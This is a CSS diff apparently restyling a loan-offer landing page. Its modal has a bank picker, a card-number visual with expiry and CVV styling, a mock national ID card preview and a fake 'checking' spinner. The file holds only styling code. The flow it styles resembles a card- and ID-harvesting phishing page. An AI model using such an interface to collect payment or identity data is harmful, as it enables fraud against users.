@@ -14,7 +14,6 @@
     --teal-deep:#0B3A34;
     --teal-mid:#155C51;
     --gold:#AD7F3F;
-    --gold-light:#D4A84B;
     --sage:#E3E9DF;
     --line:#D8D0BC;
     --white:#FFFFFF;
@@ -23,7 +22,6 @@
     --shadow-lg:0 28px 56px -24px rgba(21,31,27,0.4);
   }
   *{box-sizing:border-box;}
-  html{scroll-behavior:smooth;}
   body{
     margin:0;
     background:var(--paper);
@@ -35,43 +33,10 @@
     font-family:'Fraunces',serif;
     font-weight:600;
     margin:0;
-    letter-spacing:-0.01em;
   }
-  .mono{font-family:'IBM Plex Mono',monospace;}
-  a{color:inherit;text-decoration:none;}
   .wrap{max-width:1080px;margin:0 auto;padding:0 24px;}
-
-  .kilim{
-    height:14px;
-    width:100%;
-    background-image: repeating-linear-gradient(135deg, var(--gold) 0 6px, transparent 6px 12px);
-    opacity:0.55;
-  }
-  .kilim.dark{background-image: repeating-linear-gradient(135deg, var(--sage) 0 6px, transparent 6px 12px); opacity:0.5;}
-
-  header{
-    position:sticky;top:0;z-index:50;
-    background:rgba(246,241,228,0.92);
-    backdrop-filter:blur(6px);
-    border-bottom:1px solid var(--line);
-  }
-  .nav{
-    display:flex;align-items:center;justify-content:space-between;
-    padding:18px 24px;max-width:1080px;margin:0 auto;
-  }
-  .logo{
-    font-family:'Fraunces',serif;font-weight:700;font-size:22px;
-    display:flex;align-items:baseline;gap:4px;
-  }
-  .logo span{color:var(--teal-mid);}
-  nav ul{list-style:none;display:flex;gap:28px;margin:0;padding:0;font-size:14.5px;font-weight:600;}
-  nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
-  nav ul a:hover{opacity:1;}
-
-  /* SHINY BUTTONS */
   .cta-btn{
-    position:relative;
-    background:linear-gradient(135deg, #0B3A34, #155C51, #1A7A6A);
+    background:var(--teal-deep);
     color:var(--white);
     border:none;
     border-radius:999px;
@@ -79,429 +44,370 @@
     font-weight:700;
     font-size:15px;
     cursor:pointer;
-    letter-spacing:.02em;
     font-family:'Manrope',sans-serif;
-    box-shadow:0 4px 20px rgba(21,92,81,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
-    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow:hidden;
-    text-transform:uppercase;
+    transition:transform .2s;
   }
-  .cta-btn::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(105deg,
-      transparent 30%,
-      rgba(255,255,255,0.2) 40%,
-      rgba(255,255,255,0.5) 48%,
-      rgba(255,255,255,0.8) 52%,
-      rgba(255,255,255,0.2) 60%,
-      transparent 70%
-    );
-    transform:rotate(25deg) translateX(-130%);
-    animation:shinySweep 3.5s infinite ease-in-out;
-    pointer-events:none;
-    filter:blur(2px);
+  .cta-btn:hover{transform:scale(1.02);}
+  header{
+    position:sticky;top:0;z-index:50;
+    background:rgba(246,241,228,0.92);
+    backdrop-filter:blur(6px);
+    border-bottom:1px solid var(--line);
+    padding:12px 0;
   }
-  @keyframes shinySweep{
-    0%{transform:rotate(25deg) translateX(-130%);}
-    60%{transform:rotate(25deg) translateX(130%);}
-    100%{transform:rotate(25deg) translateX(130%);}
+  .nav{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    max-width:1080px;
+    margin:0 auto;
+    padding:0 24px;
   }
-  .cta-btn::after{
-    content:'';
-    position:absolute;
-    inset:0;
-    border-radius:999px;
-    padding:2px;
-    background:linear-gradient(135deg, rgba(255,215,0,0.4), rgba(255,215,0,0.1), rgba(255,215,0,0.4));
-    -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-    -webkit-mask-composite:xor;
-    mask-composite:exclude;
-    pointer-events:none;
-  }
-  .cta-btn:hover{
-    transform:translateY(-4px) scale(1.03);
-    box-shadow:0 12px 40px rgba(21,92,81,0.45), 0 0 60px rgba(173,127,63,0.2);
-  }
-  .cta-btn:active{
-    transform:translateY(0) scale(0.97);
-    box-shadow:0 2px 10px rgba(21,92,81,0.3);
-  }
-
-  .cta-ghost{
-    position:relative;
-    background:transparent;
-    border:2px solid var(--teal-deep);
-    color:var(--teal-deep);
-    border-radius:999px;
-    padding:12px 28px;
+  .logo{
+    font-family:'Fraunces',serif;
     font-weight:700;
-    font-size:15px;
-    cursor:pointer;
-    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow:hidden;
-    text-transform:uppercase;
-    letter-spacing:.02em;
+    font-size:22px;
   }
-  .cta-ghost::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(105deg,
-      transparent 30%,
-      rgba(173,127,63,0.15) 40%,
-      rgba(173,127,63,0.3) 48%,
-      rgba(173,127,63,0.5) 52%,
-      rgba(173,127,63,0.15) 60%,
-      transparent 70%
-    );
-    transform:rotate(25deg) translateX(-130%);
-    animation:shinySweepGhost 4s infinite ease-in-out;
-    pointer-events:none;
-    filter:blur(2px);
+  .logo span{color:var(--teal-mid);}
+  .hero{padding:60px 0;}
+  .hero-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:40px;
+    align-items:center;
   }
-  @keyframes shinySweepGhost{
-    0%{transform:rotate(25deg) translateX(-130%);}
-    60%{transform:rotate(25deg) translateX(130%);}
-    100%{transform:rotate(25deg) translateX(130%);}
-  }
-  .cta-ghost:hover{
-    background:var(--teal-deep);
-    color:var(--white);
-    transform:translateY(-4px) scale(1.03);
-    box-shadow:0 12px 40px rgba(21,92,81,0.25);
-  }
-
-  .hero{padding:88px 0 56px;}
-  .hero-grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:48px;align-items:center;}
-  .eyebrow{
-    font-family:'IBM Plex Mono',monospace;font-size:13px;letter-spacing:.08em;
-    text-transform:uppercase;color:var(--teal-mid);margin-bottom:14px;display:block;
-  }
-  .hero h1{font-size:clamp(34px,5vw,54px);line-height:1.05;}
-  .hero h1 em{font-style:normal;color:var(--teal-deep);border-bottom:4px solid var(--gold);}
-  .hero p{margin-top:20px;font-size:17.5px;color:var(--ink-soft);max-width:46ch;}
-  .hero-actions{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap;}
+  .hero h1{font-size:clamp(32px,4vw,48px);line-height:1.1;}
+  .hero h1 em{color:var(--teal-deep);border-bottom:4px solid var(--gold);font-style:normal;}
+  .hero p{color:var(--ink-soft);font-size:17px;margin-top:16px;}
+  .hero-actions{display:flex;gap:12px;margin-top:24px;flex-wrap:wrap;}
   .hero-card{
-    background:var(--white);border:1px solid var(--line);border-radius:20px;
-    padding:28px;box-shadow:var(--shadow-lg);
-    transition:transform .3s ease;
+    background:var(--white);
+    border:1px solid var(--line);
+    border-radius:20px;
+    padding:24px;
+    box-shadow:var(--shadow-lg);
   }
-  .hero-card .row{display:flex;justify-content:space-between;font-size:13.5px;color:var(--ink-soft);margin-bottom:6px;}
-  .hero-card .big-number{font-family:'IBM Plex Mono',monospace;font-size:30px;font-weight:600;color:var(--teal-deep);}
-  .hero-card hr{border:none;border-top:1px dashed var(--line);margin:16px 0;}
-
-  section{padding:64px 0;}
-  .section-head{max-width:60ch;margin-bottom:36px;}
-  .section-head .eyebrow{margin-bottom:10px;}
-  .section-head h2{font-size:clamp(26px,3.2vw,36px);}
-  .section-head p{color:var(--ink-soft);margin-top:12px;font-size:16px;}
-
+  .hero-card .row{
+    display:flex;
+    justify-content:space-between;
+    font-size:14px;
+    color:var(--ink-soft);
+    padding:4px 0;
+  }
+  .hero-card .big-number{
+    font-size:28px;
+    font-weight:700;
+    color:var(--teal-deep);
+    font-family:'IBM Plex Mono',monospace;
+  }
+  .hero-card hr{border:none;border-top:1px dashed var(--line);margin:12px 0;}
+  section{padding:50px 0;}
+  .section-head{margin-bottom:30px;}
+  .section-head h2{font-size:clamp(24px,2.8vw,34px);}
+  .section-head p{color:var(--ink-soft);margin-top:8px;}
   .calc-card{
-    background:var(--white);border:1px solid var(--line);border-radius:20px;
-    padding:36px;display:grid;grid-template-columns:1.1fr 0.9fr;gap:40px;
+    background:var(--white);
+    border:1px solid var(--line);
+    border-radius:20px;
+    padding:32px;
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:32px;
     box-shadow:var(--shadow-md);
   }
-  .slider-block{margin-bottom:30px;}
-  .slider-block label{display:flex;justify-content:space-between;font-weight:700;font-size:15px;margin-bottom:10px;}
-  .slider-value{font-family:'IBM Plex Mono',monospace;color:var(--teal-deep);font-size:17px;}
+  .slider-block{margin-bottom:24px;}
+  .slider-block label{
+    display:flex;
+    justify-content:space-between;
+    font-weight:700;
+    font-size:15px;
+    margin-bottom:8px;
+  }
+  .slider-value{color:var(--teal-deep);font-family:'IBM Plex Mono',monospace;}
   input[type=range]{
-    -webkit-appearance:none;width:100%;height:6px;border-radius:4px;
+    -webkit-appearance:none;
+    width:100%;
+    height:6px;
+    border-radius:4px;
     background:linear-gradient(to right, var(--teal-mid) 0%, var(--teal-mid) var(--fill,50%), var(--sage) var(--fill,50%), var(--sage) 100%);
   }
   input[type=range]::-webkit-slider-thumb{
-    -webkit-appearance:none;width:22px;height:22px;border-radius:50%;
-    background:var(--white);border:4px solid var(--teal-deep);cursor:pointer;
-    box-shadow:var(--shadow-sm);transition:transform .15s ease;
+    -webkit-appearance:none;
+    width:20px;
+    height:20px;
+    border-radius:50%;
+    background:var(--white);
+    border:4px solid var(--teal-deep);
+    cursor:pointer;
   }
-  input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.1);}
-  .range-labels{display:flex;justify-content:space-between;font-size:12.5px;color:var(--ink-soft);margin-top:8px;font-family:'IBM Plex Mono',monospace;}
-
+  .range-labels{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    color:var(--ink-soft);
+    margin-top:6px;
+    font-family:'IBM Plex Mono',monospace;
+  }
   .results{
-    background:var(--teal-deep);color:var(--white);border-radius:16px;padding:26px;
+    background:var(--teal-deep);
+    color:var(--white);
+    border-radius:16px;
+    padding:24px;
   }
-  .results .pair{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.15);font-size:14.5px;}
+  .results .pair{
+    display:flex;
+    justify-content:space-between;
+    padding:8px 0;
+    border-bottom:1px solid rgba(255,255,255,0.1);
+    font-size:14px;
+  }
   .results .pair:last-child{border-bottom:none;}
-  .results .headline-pair{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:18px;}
-  .results .headline-pair .num{font-family:'IBM Plex Mono',monospace;font-size:32px;font-weight:600;color:#E8C688;}
-  .results .headline-pair .lbl{font-size:13.5px;opacity:0.85;}
-
-  .offers-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+  .results .headline-pair{
+    display:flex;
+    justify-content:space-between;
+    align-items:baseline;
+    margin-bottom:12px;
+  }
+  .results .headline-pair .num{
+    font-family:'IBM Plex Mono',monospace;
+    font-size:28px;
+    font-weight:600;
+    color:#E8C688;
+  }
+  .results .headline-pair .lbl{font-size:13px;opacity:0.8;}
+  .offers-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:24px;
+  }
   .offer-card{
-    background:var(--white);border:1px solid var(--line);border-radius:18px;padding:28px;
-    position:relative;overflow:hidden;box-shadow:var(--shadow-sm);
-    transition:transform .25s ease, box-shadow .25s ease;
+    background:var(--white);
+    border:1px solid var(--line);
+    border-radius:18px;
+    padding:24px;
+    box-shadow:var(--shadow-sm);
+    transition:transform .2s;
   }
   .offer-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);}
   .offer-card.vip{background:var(--teal-deep);color:var(--white);}
   .offer-card .tag{
-    font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:.06em;
-    text-transform:uppercase;color:var(--gold);margin-bottom:10px;display:block;
+    font-family:'IBM Plex Mono',monospace;
+    font-size:12px;
+    color:var(--gold);
+    text-transform:uppercase;
   }
-  .offer-card h3{font-size:24px;margin-bottom:6px;}
-  .offer-card .amount{font-family:'IBM Plex Mono',monospace;font-size:19px;margin-bottom:18px;}
-  .offer-card ul{list-style:none;padding:0;margin:0;font-size:14.5px;}
-  .offer-card ul li{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed var(--line);}
-  .offer-card.vip ul li{border-bottom:1px dashed rgba(255,255,255,0.25);}
-
-  .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
-  .step{border-left:2px solid var(--gold);padding-left:18px;}
+  .offer-card h3{font-size:22px;margin:4px 0;}
+  .offer-card .amount{font-family:'IBM Plex Mono',monospace;font-size:18px;margin-bottom:12px;}
+  .offer-card ul{list-style:none;padding:0;margin:0;font-size:14px;}
+  .offer-card ul li{
+    display:flex;
+    justify-content:space-between;
+    padding:6px 0;
+    border-bottom:1px dashed var(--line);
+  }
+  .offer-card.vip ul li{border-bottom:1px dashed rgba(255,255,255,0.2);}
+  .steps{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:24px;
+  }
+  .step{border-left:3px solid var(--gold);padding-left:16px;}
   .step .num{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:14px;}
-  .step h3{font-size:19px;margin:8px 0 8px;}
-  .step p{color:var(--ink-soft);font-size:15px;margin:0;}
-
+  .step h3{font-size:18px;margin:4px 0;}
+  .step p{color:var(--ink-soft);font-size:14px;margin:0;}
   .faq-item{border-bottom:1px solid var(--line);}
   .faq-q{
-    width:100%;text-align:left;background:none;border:none;cursor:pointer;
-    padding:20px 4px;font-size:16.5px;font-weight:700;font-family:'Manrope',sans-serif;
-    display:flex;justify-content:space-between;align-items:center;color:var(--ink);
+    width:100%;
+    text-align:left;
+    background:none;
+    border:none;
+    cursor:pointer;
+    padding:16px 4px;
+    font-size:16px;
+    font-weight:700;
+    font-family:'Manrope',sans-serif;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
   }
-  .faq-q .icon{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:20px;}
-  .faq-a{max-height:0;overflow:hidden;transition:max-height .25s ease;font-size:15px;color:var(--ink-soft);}
-  .faq-a p{margin:0 0 18px;padding-right:20px;}
-  .faq-item.open .faq-a{max-height:220px;}
-
-  .field{margin-bottom:20px;}
-  .field label{display:block;font-weight:700;font-size:14.5px;margin-bottom:8px;}
-  .field input, .field select{
-    width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:10px;
-    font-family:'Manrope',sans-serif;font-size:15px;background:var(--paper);
-    transition:border-color .18s ease, box-shadow .18s ease;
+  .faq-a{
+    max-height:0;
+    overflow:hidden;
+    transition:max-height .3s ease;
+    font-size:15px;
+    color:var(--ink-soft);
   }
-  .field input:focus, .field select:focus{
-    border-color:var(--teal-mid);box-shadow:0 0 0 3px rgba(21,92,81,0.15);outline:none;
+  .faq-a p{margin:0 0 16px;}
+  .faq-item.open .faq-a{max-height:200px;}
+  .field{margin-bottom:16px;}
+  .field label{display:block;font-weight:700;font-size:14px;margin-bottom:4px;}
+  .field input,.field select{
+    width:100%;
+    padding:12px 14px;
+    border:1.5px solid var(--line);
+    border-radius:10px;
+    font-family:'Manrope',sans-serif;
+    font-size:15px;
+    background:var(--paper);
   }
-  .toggle-row{display:flex;gap:12px;}
+  .field input:focus,.field select:focus{
+    border-color:var(--teal-mid);
+    outline:none;
+  }
+  .toggle-row{display:flex;gap:10px;}
   .toggle-btn{
-    flex:1;padding:13px;border-radius:10px;border:1.5px solid var(--line);
-    background:var(--white);cursor:pointer;font-weight:700;font-size:14.5px;
-    transition:background .18s ease, color .18s ease, border-color .18s ease;
+    flex:1;
+    padding:12px;
+    border-radius:10px;
+    border:1.5px solid var(--line);
+    background:var(--white);
+    cursor:pointer;
+    font-weight:700;
+    font-size:14px;
   }
   .toggle-btn.active{background:var(--teal-deep);color:var(--white);border-color:var(--teal-deep);}
-  .checkline{display:flex;gap:10px;align-items:flex-start;margin-bottom:14px;font-size:13.5px;color:var(--ink-soft);}
+  .checkline{
+    display:flex;
+    gap:10px;
+    align-items:flex-start;
+    font-size:14px;
+    color:var(--ink-soft);
+    margin-bottom:10px;
+  }
   .checkline input{margin-top:3px;}
-
   .modal-overlay{
-    position:fixed;inset:0;background:rgba(11,20,17,0.65);
-    display:none;align-items:flex-start;justify-content:center;
-    z-index:200;padding:40px 20px;overflow-y:auto;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.6);
+    display:none;
+    align-items:flex-start;
+    justify-content:center;
+    z-index:200;
+    padding:30px 16px;
+    overflow-y:auto;
   }
   .modal-overlay.active{display:flex;}
   .modal-card{
-    background:var(--white);border-radius:20px;padding:36px;max-width:720px;width:100%;
-    position:relative;box-shadow:var(--shadow-lg);
-    animation:modalIn .22s ease;
+    background:var(--white);
+    border-radius:20px;
+    padding:32px;
+    max-width:680px;
+    width:100%;
+    position:relative;
+    box-shadow:var(--shadow-lg);
+    animation:modalIn .25s ease;
   }
-  @keyframes modalIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+  @keyframes modalIn{
+    from{opacity:0;transform:translateY(20px);}
+    to{opacity:1;transform:translateY(0);}
+  }
   .modal-close{
-    position:absolute;top:18px;right:18px;background:var(--sage);border:none;
-    width:34px;height:34px;border-radius:50%;cursor:pointer;font-size:15px;font-weight:700;
-    transition:background .18s ease;
+    position:absolute;
+    top:12px;
+    right:12px;
+    background:var(--sage);
+    border:none;
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    cursor:pointer;
+    font-size:18px;
   }
-  .modal-close:hover{background:var(--line);}
-
-  /* ===== BANK SELECT ===== */
   .bank-grid{
-    display:grid;grid-template-columns:1fr 1fr;gap:12px;
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:10px;
   }
   .bank-option{
-    padding:14px 12px;border:2px solid var(--line);border-radius:14px;
-    cursor:pointer;text-align:center;transition:all .25s ease;
+    padding:12px;
+    border:2px solid var(--line);
+    border-radius:12px;
+    cursor:pointer;
+    text-align:center;
+    transition:all .2s;
     background:var(--white);
-    position:relative;
   }
-  .bank-option:hover{
-    border-color:var(--teal-mid);
-    transform:translateY(-3px);
-    box-shadow:var(--shadow-sm);
-  }
-  .bank-option.selected{
-    border-color:var(--teal-deep);
-    background:var(--sage);
-    box-shadow:0 0 30px rgba(173,127,63,0.15);
-  }
-  .bank-option.selected::after{
-    content:'✓';
-    position:absolute;
-    top:-8px;right:-8px;
-    background:var(--teal-deep);
-    color:white;
-    width:22px;height:22px;
-    border-radius:50%;
-    font-size:12px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
+  .bank-option:hover{border-color:var(--teal-mid);transform:translateY(-2px);}
+  .bank-option.selected{border-color:var(--teal-deep);background:var(--sage);}
   .bank-option .bank-logo-img{
-    height:38px;
-    max-width:130px;
+    height:32px;
+    max-width:100px;
     object-fit:contain;
-    margin-bottom:4px;
     display:block;
-    margin-left:auto;
-    margin-right:auto;
+    margin:0 auto 4px;
   }
-  .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
+  .bank-option .bank-name{font-size:12px;font-weight:600;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
-
-  /* ===== PREMIUM CARD VISUAL ===== */
   .card-input-wrap{
     background:var(--paper);
     border-radius:16px;
-    padding:24px;
+    padding:20px;
     text-align:center;
     border:2px dashed var(--line);
-    transition:all .4s ease;
-    position:relative;
   }
   .card-input-wrap .bank-card-visual{
     position:relative;
-    width:100%;
-    max-width:380px;
+    max-width:360px;
     margin:0 auto 16px;
-    padding:24px 28px;
-    border-radius:20px;
+    padding:20px 24px;
+    border-radius:16px;
     color:white;
     font-family:'IBM Plex Mono',monospace;
-    transition:all .5s ease;
-    box-shadow:0 12px 48px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
-    min-height:190px;
+    box-shadow:0 8px 32px rgba(0,0,0,0.25);
+    min-height:170px;
     display:flex;
     flex-direction:column;
     justify-content:space-between;
     cursor:text;
-    position:relative;
     overflow:hidden;
   }
-  .card-input-wrap .bank-card-visual::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    right:-20%;
-    width:250px;
-    height:250px;
-    border-radius:50%;
-    background:rgba(255,255,255,0.06);
-    pointer-events:none;
-  }
-  .card-input-wrap .bank-card-visual::after{
-    content:'';
-    position:absolute;
-    bottom:-30%;
-    left:-10%;
-    width:180px;
-    height:180px;
-    border-radius:50%;
-    background:rgba(255,255,255,0.04);
-    pointer-events:none;
-  }
   .card-input-wrap .bank-card-visual .card-chip{
-    width:40px;
-    height:30px;
-    background:linear-gradient(135deg, #D4A84B, #B8943A, #9A7A2E);
-    border-radius:6px;
-    margin-bottom:14px;
-    border:1px solid rgba(255,255,255,0.2);
-    position:relative;
-    z-index:1;
-    box-shadow:inset 0 2px 4px rgba(0,0,0,0.2);
-  }
-  .card-input-wrap .bank-card-visual .card-chip::after{
-    content:'';
-    position:absolute;
-    top:4px;
-    left:4px;
-    right:4px;
-    bottom:4px;
-    border-radius:3px;
-    background:linear-gradient(135deg, rgba(255,255,255,0.1), transparent);
+    width:36px;
+    height:26px;
+    background:linear-gradient(135deg,#D4A84B,#9A7A2E);
+    border-radius:5px;
+    margin-bottom:10px;
   }
   .card-input-wrap .bank-card-visual .card-top{
     display:flex;
     justify-content:space-between;
     align-items:flex-start;
-    position:relative;
-    z-index:1;
   }
   .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{
-    font-size:14px;
+    font-size:13px;
     font-weight:700;
-    letter-spacing:2px;
+    letter-spacing:1px;
     text-transform:uppercase;
     opacity:0.85;
-    text-shadow:0 1px 2px rgba(0,0,0,0.2);
-  }
-  .card-input-wrap .bank-card-visual .card-top .card-type{
-    font-size:24px;
-    opacity:0.6;
-    letter-spacing:2px;
-    text-shadow:0 1px 2px rgba(0,0,0,0.2);
   }
   .card-input-wrap .bank-card-visual .card-number-display{
-    font-size:22px;
-    letter-spacing:5px;
+    font-size:20px;
+    letter-spacing:4px;
     text-align:center;
-    padding:12px 0 10px;
-    text-shadow:0 2px 4px rgba(0,0,0,0.25);
+    padding:8px 0;
     font-weight:500;
-    position:relative;
-    z-index:1;
-    font-family:'IBM Plex Mono',monospace;
   }
   .card-input-wrap .bank-card-visual .card-bottom{
     display:flex;
     justify-content:space-between;
-    align-items:flex-end;
     font-size:11px;
-    opacity:0.85;
-    position:relative;
-    z-index:1;
+    opacity:0.8;
   }
   .card-input-wrap .bank-card-visual .card-bottom .card-expiry-label{
     text-transform:uppercase;
     font-size:8px;
     opacity:0.5;
-    letter-spacing:1px;
   }
   .card-input-wrap .bank-card-visual .card-bottom .card-expiry-value{
-    font-size:14px;
+    font-size:13px;
     font-weight:600;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-label{
-    text-transform:uppercase;
-    font-size:8px;
-    opacity:0.5;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-value{
-    font-size:14px;
-    font-weight:600;
-    letter-spacing:1px;
-  }
-  .card-input-wrap .bank-card-visual .card-contactless{
-    position:absolute;
-    bottom:16px;
-    right:18px;
-    font-size:20px;
-    opacity:0.25;
-    z-index:1;
   }
   .card-input-wrap .bank-card-visual .card-logo-on-card{
     position:absolute;
-    top:14px;
-    right:16px;
-    height:28px;
+    top:12px;
+    right:14px;
+    height:24px;
     opacity:0.5;
-    z-index:1;
     object-fit:contain;
   }
   .card-input-wrap .card-number-input-hidden{
@@ -511,58 +417,58 @@
     height:1px;
   }
   .progress-bar{
-    width:100%;height:6px;background:var(--sage);border-radius:4px;
-    margin:12px 0 8px;overflow:hidden;
+    width:100%;
+    height:5px;
+    background:var(--sage);
+    border-radius:4px;
+    margin:10px 0 6px;
+    overflow:hidden;
   }
   .progress-bar .fill{
-    height:100%;background:var(--teal-deep);border-radius:4px;
-    transition:width .3s ease;width:0%;
+    height:100%;
+    background:var(--teal-deep);
+    border-radius:4px;
+    transition:width .3s;
+    width:0%;
   }
-  .progress-label{font-size:13px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
-
+  .progress-label{font-size:12px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
   .card-details-row{
     display:grid;
     grid-template-columns:1fr 1fr;
-    gap:16px;
-    margin:16px 0 0;
+    gap:14px;
+    margin:14px 0 0;
   }
   .card-details-row .field{margin-bottom:0;}
-
-  /* ===== REAL ID CARD ===== */
   .id-card-preview{
-    background:linear-gradient(145deg, #f5f0e8, #e5ddd2);
-    border-radius:16px;
-    padding:20px 24px;
+    background:linear-gradient(145deg,#f5f0e8,#e5ddd2);
+    border-radius:14px;
+    padding:16px 20px;
     border:2px solid #b8aa98;
-    box-shadow:0 8px 24px rgba(0,0,0,0.12);
-    max-width:440px;
-    margin:16px auto;
-    position:relative;
+    box-shadow:0 8px 24px rgba(0,0,0,0.1);
+    max-width:420px;
+    margin:14px auto;
   }
   .id-card-preview .id-header{
     display:flex;
     justify-content:space-between;
-    align-items:center;
     border-bottom:2px solid #b8aa98;
-    padding-bottom:8px;
-    margin-bottom:12px;
+    padding-bottom:6px;
+    margin-bottom:10px;
   }
   .id-card-preview .id-header .id-title{
     font-weight:700;
-    font-size:12px;
+    font-size:11px;
     color:#2d2a24;
-    letter-spacing:0.5px;
-    line-height:1.3;
+    line-height:1.2;
   }
   .id-card-preview .id-header .id-title small{
     display:block;
     font-weight:400;
-    font-size:9px;
+    font-size:8px;
     color:#6a6258;
-    letter-spacing:0.3px;
   }
   .id-card-preview .id-header .id-logo{
-    font-size:14px;
+    font-size:13px;
     font-weight:800;
     color:#8B0000;
     text-align:right;
@@ -570,177 +476,135 @@
   }
   .id-card-preview .id-header .id-logo small{
     display:block;
-    font-size:8px;
+    font-size:7px;
     font-weight:400;
     color:#6a6258;
   }
   .id-card-preview .id-photo{
-    width:85px;
-    height:105px;
-    background:linear-gradient(135deg, #d4c8b8, #c0b4a4);
+    width:70px;
+    height:90px;
+    background:linear-gradient(135deg,#d4c8b8,#c0b4a4);
     border-radius:4px;
     border:1px solid #b0a494;
     float:right;
-    margin-left:16px;
+    margin-left:14px;
     display:flex;
     align-items:center;
     justify-content:center;
-    font-size:36px;
+    font-size:30px;
     color:#8a7a6a;
-    position:relative;
-  }
-  .id-card-preview .id-photo::after{
-    content:'';
-    position:absolute;
-    bottom:0;
-    left:0;
-    right:0;
-    height:20px;
-    background:linear-gradient(to top, rgba(0,0,0,0.05), transparent);
-    border-radius:0 0 4px 4px;
   }
   .id-card-preview .id-row{
     display:flex;
-    padding:3px 0;
-    font-size:11px;
+    padding:2px 0;
+    font-size:10px;
     border-bottom:1px solid rgba(0,0,0,0.04);
   }
   .id-card-preview .id-row .id-label{
-    width:110px;
+    width:90px;
     font-weight:600;
     color:#4a4238;
-    font-size:9px;
+    font-size:8px;
     text-transform:uppercase;
-    letter-spacing:0.5px;
   }
   .id-card-preview .id-row .id-value{
     flex:1;
     color:#1a1612;
     font-weight:500;
-    font-size:11px;
+    font-size:10px;
     text-transform:uppercase;
   }
   .id-card-preview .id-footer{
-    margin-top:12px;
-    padding-top:10px;
+    margin-top:10px;
+    padding-top:8px;
     border-top:2px solid #b8aa98;
     display:flex;
     justify-content:space-between;
-    font-size:8px;
+    font-size:7px;
     color:#6a6258;
     text-transform:uppercase;
-    letter-spacing:0.5px;
   }
   .id-card-preview .id-signature{
-    margin-top:8px;
-    padding-top:8px;
+    margin-top:6px;
+    padding-top:6px;
     border-top:1px dashed #b8aa98;
     display:flex;
     justify-content:space-between;
-    font-size:9px;
+    font-size:8px;
     color:#4a4238;
   }
   .id-card-preview .id-signature .sig-line{
     border-bottom:1px solid #a09080;
-    width:100px;
+    width:80px;
     height:1px;
-    margin-top:4px;
+    margin-top:3px;
   }
-
-  /* ===== CHECKING ===== */
-  .checking-container{
-    text-align:center;
-    padding:30px 0;
-  }
+  .checking-container{text-align:center;padding:30px 0;}
   .checking-container .spinner{
-    width:64px;
-    height:64px;
-    border:6px solid var(--sage);
+    width:56px;
+    height:56px;
+    border:5px solid var(--sage);
     border-top-color:var(--teal-deep);
     border-radius:50%;
-    animation:spin 0.9s linear infinite;
-    margin:0 auto 24px;
+    animation:spin .9s linear infinite;
+    margin:0 auto 20px;
   }
   @keyframes spin{to{transform:rotate(360deg);}}
-  .checking-container .check-icon{
-    font-size:52px;
-    margin-bottom:16px;
-    animation:pulse 1.5s ease-in-out infinite;
-  }
-  @keyframes pulse{
-    0%,100%{transform:scale(1);opacity:0.8;}
-    50%{transform:scale(1.1);opacity:1;}
-  }
-  .checking-container .check-title{
-    font-size:22px;
-    font-weight:700;
-    color:var(--teal-deep);
-  }
-  .checking-container .check-sub{
-    color:var(--ink-soft);
-    font-size:15px;
-    margin-top:8px;
-  }
+  .checking-container .check-title{font-size:20px;font-weight:700;color:var(--teal-deep);}
+  .checking-container .check-sub{color:var(--ink-soft);font-size:14px;margin-top:6px;}
   .checking-container .check-dots{
-    margin-top:12px;
+    margin-top:10px;
     display:flex;
     justify-content:center;
-    gap:8px;
+    gap:6px;
   }
   .checking-container .check-dots span{
-    width:10px;height:10px;
+    width:8px;
+    height:8px;
     border-radius:50%;
     background:var(--sage);
     animation:dotPulse 1.4s ease-in-out infinite;
   }
-  .checking-container .check-dots span:nth-child(2){animation-delay:0.2s;}
-  .checking-container .check-dots span:nth-child(3){animation-delay:0.4s;}
+  .checking-container .check-dots span:nth-child(2){animation-delay:.2s;}
+  .checking-container .check-dots span:nth-child(3){animation-delay:.4s;}
   @keyframes dotPulse{
-    0%,80%,100%{transform:scale(0.4);background:var(--sage);}
+    0%,80%,100%{transform:scale(.4);background:var(--sage);}
